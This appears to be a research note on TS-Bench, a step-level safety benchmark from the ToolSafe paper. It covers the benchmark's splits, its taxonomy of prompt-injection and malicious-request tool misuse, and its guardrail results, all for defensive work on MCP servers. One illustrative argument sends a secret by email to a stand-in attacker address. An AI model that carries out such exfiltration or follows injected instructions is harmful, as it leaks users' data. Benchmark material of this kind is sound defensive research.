# TS-Bench (ToolSafe Step-Level Safety Benchmark)

## Source
- **Paper:** ToolSafe: Enhancing Tool Invocation Safety of LLM-based agents via Proactive Step-level Guardrail and Feedback (Mou et al., 2026)
- **Authors:** Yutao Mou, Zhangchi Xue, Lijun Li, Peiyang Liu, Shikun Zhang, Wei Ye, Jing Shao
- **Institution:** Peking University (National Engineering Research Center for Software Engineering) + Shanghai AI Laboratory
- **Link:** https://github.com/MurrayTom/ToolSafe
- **arXiv:** 2601.10156
- **Year:** 2026

## Format & Size

TS-Bench is a step-level safety annotation layer built on top of three existing agent-safety
datasets, plus AgentAlign as an additional training source. Each trajectory is decomposed
into (action, observation) pairs and every candidate action is labeled **safe / controversial
/ unsafe before execution**, giving a pre-execution judgment task rather than a post-hoc audit.

- **AgentHarm-Traj:** 731 trajectories (206 safe / 315 controversial / 210 unsafe)
- **ASB-Traj:** 5,237 trajectories (2,700 / 1,466 / 1,071)
- **AgentDojo-Traj:** 1,220 trajectories (868 / N/A / 352)
- **Total:** ~7,188 labeled trajectories across three source benchmarks
- **Availability:** GitHub (MurrayTom/ToolSafe) — open source

## Core Contribution: Two-Dimensional Taxonomy of Unsafe Tool Invocation

ToolSafe's central framing identifies **four unsafe patterns** along two orthogonal axes:

|                                 | Harmful Tools (HT)       | Benign Tools, Risky Args (BTRA)       |
|---------------------------------|--------------------------|---------------------------------------|
| **Malicious User Request (MUR)**| MUR + HT                 | MUR + BTRA                            |
| **Prompt Injection (PI)**       | PI + HT                  | PI + BTRA                             |

- **Axis 1 — Triggering cause:** the user's own request is malicious vs. a third-party prompt
  injection contaminates the trajectory
- **Axis 2 — Manifestation:** the tool is intrinsically dangerous vs. a benign tool being
  weaponized by its arguments

## Data Structure

| Field/Column | Data Type | Example Values | Usable As-Is? | Notes |
|---|---|---|---|---|
| Trajectory ID | String | AgentHarm-007 | Yes | Links back to source benchmark |
| Source benchmark | Categorical | AgentHarm / ASB / AgentDojo | Yes | Indicates attack-type provenance |
| Interaction history H_t | Structured list | [(a_0,o_0),…,(a_{t-1},o_{t-1})] | Yes | User request + prior thought-action-observation rounds |
| Candidate action a_t | Structured | Tool name + arguments + thought | Yes | The action to be judged *before* execution |
| Tool spec T | Structured | Tool descriptions + usage constraints | Yes | Needed to distinguish HT vs. benign tools |
| Safety label y_t | Categorical | safe / controversial / unsafe | Yes | Three-way label at step granularity |
| Pattern label | Categorical | MUR+HT / MUR+BTRA / PI+HT / PI+BTRA / safe | Yes | Fine-grained failure mode |
| Rationale | Text | Free-form reasoning | Partial | For interpretability/feedback, not direct scoring |

## Proposed Risk Dimensions

### Triggering-Cause Indicator
- **Feeding columns:** Interaction history H_t, user request u, candidate action a_t
- **Proposed scale:** 1-10, higher = stronger evidence the action was contaminated by a
  third-party injection (PI) rather than flowing from the user's own request (MUR)
- **Derivation:** Compare semantic alignment between the original user request and the
  candidate action. If a_t pursues goals not traceable to u, treat as PI evidence (8-10).
  If a_t is consistent with u but u itself is harmful, treat as MUR evidence (maps to
  severity instead). ToolSafe empirically shows guardrails drop from F1=84.80 on
  MUR-dominant AgentHarm-Traj to 63.03 on PI-dominant ASB-Traj with GPT-4o — a ~22-point
  gap is the scale ToolSafe treats as "meaningful PI-induced failure." This is the
  dimension that most directly justifies the project's Agent Compromise Indicator.

### Argument-Level Manifestation Risk (BTRA)
- **Feeding columns:** Tool spec T, candidate action a_t arguments
- **Proposed scale:** 1-10 where intrinsically harmful tools (HT) score 9-10, benign-but-weaponized
  tools (BTRA) score 6-9, and ordinary benign tools score 1-5
- **Derivation:** HT is the static-mode case — if a tool is in the "delete / exec / send-external"
  category it maps straight to high severity from the tool spec alone. BTRA is the dynamic-mode
  case — the tool is safe by spec but the arguments are dangerous (e.g.,
  `send_email(to="attacker@evil.com", body=<secret>)`). ToolSafe shows BTRA is where
  over-defensiveness is worst: high recall but low F1 on AgentDojo-Traj, because guardrails
  flag safe argument patterns as dangerous. This is the dimension that most justifies having
  a dynamic scoring mode in the framework at all.

### Controversial-Action Uncertainty Band
- **Feeding columns:** Safety label (three-way: safe/controversial/unsafe)
- **Proposed scale:** 1-10 where "controversial" maps to a middle band (4-6) and "unsafe"
  maps to 7-10
- **Derivation:** Unlike binary benchmarks (AgentHarm), TS-Bench has a middle class for
  actions that are neither clearly safe nor clearly malicious — reversible, low-impact,
  or only partially aligned with the user's goal. This maps directly to a gate/throttle/deny
  tiering: safe → allow, controversial → throttle/challenge/log, unsafe → deny. ToolSafe
  reports 1,466 controversial samples on ASB-Traj alone — enough to train a three-way
  classifier rather than a binary one, which matches the server-defense framing.

## Data Quality Notes
- TS-Bench inherits its attacks from AgentHarm, ASB, and AgentDojo — its novelty is
  **step-level labeling**, not new attack coverage. If the project already uses any of those
  three, TS-Bench adds labels rather than new data.
- **Not MCP-specific.** Per the project's MCP-scope rule, TS-Bench is supporting/related
  evidence, not core MCP coverage. Use for methodology transfer (step-level pre-execution
  judgment + 4-pattern taxonomy), not as a primary MCP data source.
- The AgentDojo-Traj split has no controversial label (N/A) — three-way classification can
  only be trained on AgentHarm-Traj and ASB-Traj.
- ToolSafe reports TS-Guard (their trained guardrail) at ~1.36 sec/sample inference latency
  and F1=90.16 on AgentHarm-Traj, 86.18 on AgentDojo-Traj — useful ceilings when evaluating
  the project's own scorer.
- Labels come from a mix of automatic extraction and manual verification by the ToolSafe
  authors; any downstream use inherits their annotator bias.

## Usefulness Verdict
TS-Bench is the closest published analog to the pre-execution step-level risk scoring the
project is trying to build, and its 2×2 taxonomy (MUR/PI × HT/BTRA) maps directly onto the
static vs. dynamic modes in the framework. Concrete value is threefold: (1) the BTRA class
empirically validates the need for dynamic, argument-aware scoring — the recall/F1 gap on
AgentDojo-Traj can be cited as motivation rather than argued from first principles;
(2) the three-way safety label (safe/controversial/unsafe) matches the gate/throttle/deny
tiering a server-side scorer naturally implements; and (3) TS-Guard's ~90 F1 at 1.36 sec/sample
is a concrete performance-latency ceiling to benchmark against.

The main limitation is domain: TS-Bench is general-agent, not MCP, so attacks are not
structured around MCP-specific surfaces (tool-description poisoning, namespace collision,
handshake abuse). Use it to import methodology — the 2×2 framing, the pre-execution judgment
task definition, the three-way label — and run evaluation on MCP-specific benchmarks like
MCPTox (#4), MCIP-Bench (#1), and MCP-AttackBench (#3) for the core results. The cleanest
thesis framing: **"ToolSafe-style pre-execution detection, relocated from the agent side
to the MCP server side."**
